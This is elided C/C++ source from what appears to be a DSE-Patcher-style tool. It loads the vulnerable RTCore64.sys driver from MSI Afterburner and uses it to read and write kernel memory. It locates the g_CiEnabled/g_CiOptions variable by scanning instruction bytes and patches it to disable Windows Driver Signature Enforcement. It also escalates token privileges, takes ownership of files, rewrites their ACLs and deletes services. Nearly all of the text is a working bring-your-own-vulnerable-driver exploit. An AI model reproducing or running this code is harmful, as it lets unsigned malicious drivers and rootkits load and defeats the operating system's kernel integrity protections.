...
int MyGetImageBaseInKernelAddressSpace(const char* szModuleName, UINT64* ui64ImageBase, ULONG* ulImageSize)
{
	...
	*ui64ImageBase = 0;
	...
	if (OpenThreadToken(GetCurrentThread(), THREAD_ALL_ACCESS, TRUE, &threadToken)) {
		DuplicateTokenEx(threadToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &newToken);
	} else {
		HANDLE procToken;
		OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &procToken);
		DuplicateTokenEx(procToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &newToken);
		CloseHandle(procToken);
	}
	MySetPrivilege(newToken, SE_DEBUG_NAME, TRUE);
	SetThreadToken(NULL, newToken);
...
int MyGetg_CiEnabledKernelAddress(UINT64 ui64ImageBase, ULONG ulImageSize, UINT64* ui64Kernelg_CiEnabled)
{
	...
	*ui64Kernelg_CiEnabled = 0;
	...
	wchar_t szNtoskrnlExe[MAX_PATH];
	...
	*ui64Kernelg_CiOptions = 0;
	...
	else
	{
		...
		for (ULONG i = 0; i < 0x6E; i += hs.len)
		{
			...
			if (ulInstructionsFound == 0 && hs.len == 3 && CiInitialize[i] == 0x48 && CiInitialize[i + 1] == 0x8B && CiInitialize[i + 2] == 0xD6)
			{
			...
			else if (ulInstructionsFound == 1 && hs.len == 2 && CiInitialize[i] == 0x8B && CiInitialize[i + 1] == 0xCD)
			{
				ulInstructionsFound = 2;
			}
			// 5th we search for the call instruction "call CipInitialize" with a length of 5 bytes
			//lint -e{679} Warning 679:Suspicious Truncation in arithmetic expression combining with pointer
			else if (ulInstructionsFound == 2 && hs.len == 5 && CiInitialize[i] == 0xE8)
			{
...
//------------------------------------------------------------------------------
int MyGetModulePath(wchar_t* szPath, DWORD dwSize)
{
...
//------------------------------------------------------------------------------
int MyTakeOwnership(wchar_t* szFile, PSID pSID)
{
	int rc = 0;
	HANDLE hToken = NULL;
...
// add entries to ACL
//------------------------------------------------------------------------------
int MyAddEntriesToACL(wchar_t* szFile, ULONG ulEntries, EXPLICIT_ACCESS* ea, PACL pOldDACL)
{
	int rc = 0;
	PACL pNewDACL = NULL;
...
//------------------------------------------------------------------------------
int MyTakeOwnershipAndAddAdminsToACL(wchar_t* szFile)
{
	int rc = 0;
...
//------------------------------------------------------------------------------
int MyMarkServiceForDeletion(const wchar_t* szServiceName)
{
	...
	lstrcpy(szSubKey, L"SYSTEM\\CurrentControlSet\\services\\");
	...
	if (RegSetValueEx(hKey, L"DeleteFlag", 0, REG_DWORD, (BYTE*)&dwDeleteFlag, sizeof(DWORD)) != ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
		return 2;
	}
...
//------------------------------------------------------------------------------
int MyDeleteSystem32DriversFile(wchar_t* szDriverFilePath)
{
	// take ownership of object and add Administrators group to ACL
...
//------------------------------------------------------------------------------
int MyCreateAndStartDriver(VULNERABLE_DRIVER* vd)
{
	int rc = 0;
	...
	if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, (std::wstring(L"SYSTEM\\CurrentControlSet\\Services\\") + vd->szServiceName).c_str(), NULL, NULL, 0, KEY_ALL_ACCESS, NULL, &hKeyDriver, NULL)) {
		rc = 2;
		goto cleanup;
	}
	{
		std::wstring imagePath = std::wstring(L"\\??\\") + vd->driverFile[0].szFilePath;
		RegSetValueEx(hKeyDriver, L"ImagePath", NULL, REG_SZ, (LPBYTE)imagePath.c_str(), (imagePath.size() + 1) * sizeof(wchar_t));
	}
	DWORD dwType;
	dwType = 1;
	RegSetValueEx(hKeyDriver, L"Type", NULL, REG_DWORD, (LPBYTE)&dwType, sizeof(dwType));
	...
	MySetPrivilege(newToken, SE_LOAD_DRIVER_NAME, TRUE);
	SetThreadToken(NULL, newToken);

	{
		UNICODE_STRING driverName;
		std::wstring wsDriverName = std::wstring(L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\") + vd->szServiceName;
		RtlInitUnicodeString(&driverName, wsDriverName.c_str());
		if (!NT_SUCCESS(g.NtLoadDriver_p(&driverName))) {
			rc = 3;
			goto cleanup;
		}
	}
...
//------------------------------------------------------------------------------
int MyStopAndDeleteDriver(VULNERABLE_DRIVER* vd)
{
	int rc = 0;
	...
	RegDeleteKey(HKEY_LOCAL_MACHINE, (std::wstring(L"SYSTEM\\CurrentControlSet\\Services\\") + vd->szServiceName).c_str());
...
int MyStopAndDeleteService(VULNERABLE_DRIVER* vd)
{
	...
	MyMarkServiceForDeletion(vd->szServiceName);
...
int MyInstallDriver(VULNERABLE_DRIVER* vd)
{
	...
	GUID guidClass;
	wchar_t szClassName[MAX_CLASS_NAME_LEN];
	...
	dwPropertyBufferSize = (DWORD)(lstrlen(szHwIdList) + 1 + 1) * sizeof(wchar_t);
...
int MyUninstallDriver(VULNERABLE_DRIVER* vd)
{
	...
	wchar_t* p = wcsrchr(vd->driverFile[0].szFilePath, L'\\');
	if (p == NULL)
	{
		return 2;
	}
	...
	wchar_t szDriverFile[MAX_PATH];
	lstrcpy(szDriverFile, p + 1);

	// retrieve path of system directory
	wchar_t szSystemDriverFilePath[MAX_PATH];
	...
	lstrcat(szSystemDriverFilePath, L"\\drivers\\");
	lstrcat(szSystemDriverFilePath, szDriverFile);

	// mark registry service key for deletion
	//lint -e{1773} Warning 1773: Attempt to cast away const (or volatile)
	if (MyMarkServiceForDeletion(vd->szServiceName) != 0)
	{
		return 4;
	}
...
int MyInitVulnerableDrivers(VULNERABLE_DRIVER* vd, DWORD dwElements)
{
	...
	for (unsigned int i = 0; i < dwElements; i++)
	{
		...
		if (i == 0)
		{
			vd->szProvider = L"RTCore64 v4.6.2 (from MSI Afterburner v4.6.2 Build 15658)";
			...
			vd->pFunctionStartDriver = MyCreateAndStartDriver;
			vd->pFunctionStopDriver = MyStopAndDeleteDriver;
			vd->szServiceName = L"RTCore64";
			vd->szDriverSymLink = L"\\\\.\\RTCore64";
			lstrcpy(vd->driverFile[0].szFilePath, szPath);
			lstrcat(vd->driverFile[0].szFilePath, L"\\RTCore64.sys");
...
extern "C" DWORD WINAPI DSEAction(THREAD_TASK_NO ttno)
{
	...
	{
		//MessageBox(NULL, L"Can't retrieve operating system version!", L"Error", 16);
		rc = 2;
		goto cleanup;
	}
	...
	{
		//MessageBox(NULL, L"DSE-Patcher requires Windows Vista or later!", L"Error", 16);
		rc = 3;
		goto cleanup;
	}
	...
	if (osvi.dwBuildNumber < 9200)
	{
		...
		g.pd.szOS = L"Windows Vista / Windows 7";
		g.pd.szModuleName = "NTOSKRNL.EXE";
		g.pd.szVariableName = L"g_CiEnabled";
		...
		{
			//MessageBox(NULL, L"Can't get image base of NTOSKRNL.EXE!", L"Error", 16);
			rc = 4;
			goto cleanup;
		}
		...
		{
			//MessageBox(NULL, L"Can't get kernel address of g_CiEnabled!", L"Error", 16);
			rc = 5;
			goto cleanup;
		}
	}
	...
	else
	{
		...
		g.pd.szOS = L"Windows 8 or later";
		g.pd.szModuleName = "CI.DLL";
		g.pd.szVariableName = L"g_CiOptions";
		g.pd.dwDSEDisableValue = 0;
		...
		if (MyGetImageBaseInKernelAddressSpace(g.pd.szModuleName, &g.pd.ui64ImageBase, &g.pd.ulImageSize) != 0)
		{
			//MessageBox(NULL, L"Can't get image base of CI.DLL!", L"Error", 16);
			rc = 6;
			goto cleanup;
		}
		...
		{
			//MessageBox(NULL, L"Can't get kernel address of g_CiOptions!", L"Error", 16);
			rc = 7;
			goto cleanup;
		}
	}
	...
	if (osvi.dwBuildNumber < g.vd[sel].dwMinSupportedBuildNumber || osvi.dwBuildNumber > g.vd[sel].dwMaxSupportedBuildNumber)
	{
		...
		//if (MessageBox(NULL, L"The selected driver is not supported on this Windows version!\nDo you want to continue?", L"Question", MB_YESNO | MB_ICONQUESTION) == IDNO)
		//{
			// leave
			rc = 8;
			goto cleanup;
	...
	{
		//MessageBox(NULL, L"Can't stop and delete service!", L"Error", 16);
		rc = 9;
		goto cleanup;
	}
	...
	{
		//MessageBox(NULL, L"Can't create and start service!", L"Error", 16);
		rc = 10;
		goto cleanup;
	}
	...
	HANDLE hDevice;
	//lint -e{1773} Warning 1773: Attempt to cast away const (or volatile)
	if (g.vd[sel].pFunctionOpenDevice(g.vd[sel].szDriverSymLink, &hDevice) != 0)
	{
		//MessageBox(NULL, L"Can't open driver device handle!", L"Error", 16);
		rc = 11;
		goto cleanup;
	}

	// this is done for every thread task
	if (ttno == ThreadTaskReadDSEOnFirstRun || ttno == ThreadTaskDisableDSE || ttno == ThreadTaskEnableDSE || ttno == ThreadTaskRestoreDSE)
	{
		// read DSE value
		...
		{
			//wsprintf(g.szMsg, L"Can't read %s at address 0x%.16I64X...", g.pd.szVariableName, g.pd.ui64PatchAddress);
			//MessageBox(NULL, g.szMsg, L"Error", 16);
			CloseHandle(hDevice);
			rc = 12;
			goto cleanup;
		}
		...
		if (!g.pd.bDSEOriginalValue)
		{
			g.pd.dwDSEOriginalValue = g.pd.dwDSEActualValue;
			g.pd.bDSEOriginalValue = TRUE;
		}
	}
	...
	if (ttno == ThreadTaskDisableDSE)
	{
		...
		{
			//MessageBox(NULL, L"Can't disable DSE!", L"Error", 16);
			CloseHandle(hDevice);
			rc = 14;
			goto cleanup;
		}
	...
	else if (ttno == ThreadTaskEnableDSE)
	{
		...
		{
			//MessageBox(NULL, L"Can't enable DSE!", L"Error", 16);
			CloseHandle(hDevice);
			rc = 16;
			goto cleanup;
		}
	...
	else if (ttno == ThreadTaskRestoreDSE)
	{
		...
		{
			//MessageBox(NULL, L"Can't restore DSE!", L"Error", 16);
			CloseHandle(hDevice);
			rc = 18;
			goto cleanup;
		}
	...
	if (ttno == ThreadTaskDisableDSE || ttno == ThreadTaskEnableDSE || ttno == ThreadTaskRestoreDSE)
	{
		// read DSE value
		g.pd.dwDSEActualValue = 0xFFFFFFFF;
		if (g.vd[sel].pFunctionReadMemory(hDevice, g.pd.ui64PatchAddress, g.pd.dwPatchSize, &g.pd.dwDSEActualValue) != 0)
